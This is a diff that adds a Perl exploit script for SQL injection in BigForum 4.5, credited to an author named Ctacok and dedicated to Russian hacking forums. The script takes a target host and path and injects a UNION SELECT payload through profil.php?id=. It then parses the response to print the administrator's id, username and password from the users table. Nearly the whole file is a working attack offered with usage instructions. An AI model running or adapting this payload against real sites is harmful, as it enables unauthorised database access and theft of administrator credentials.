@@ -1,0 +1,49 @@
+#!/usr/bin/perl
+
+use LWP::Simple;
+
+print "\n";
+
+print "##############################################################\n";
+
+print "# BigForum Version: 4.5 SQL INJECTION                        #\n";
+
+print "# Author: Ctacok  (Russian)                                  #\n";
+
+print "# Blog : www.Ctacok.ru                                       #\n";
+
+print "# Special for Antichat (forum.antichat.ru) and xakep.ru      #\n";
+
+print "# Require : Magic_quotes = Off                               #\n";
+
+print "##############################################################\n";
+
+if (@ARGV < 2)
+
+{
+
+print "\n Usage: exploit.pl [host] [path] ";
+
+print "\n EX : exploit.pl www.localhost.com /path/ \n\n";
+
+exit;
+
+}
+
+$host=$ARGV[0];
+
+$path=$ARGV[1];
+
+$vuln = "-1'+union+select+1,concat(0x3a3a3a,id,0x3a,username,0x3a,pw,0x3a3a3a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29+from+users";
+
+$doc = get($host.$path."profil.php?id=".$vuln."+--+");
+
+if ($doc =~ /:::(.+):(.+):(.+):::/){
+
+         print "\n[+] Admin id: : $1";
+
+print "\n[+] Admin username: $2";
+
+print "\n[+] Admin password: $3";
+
+}
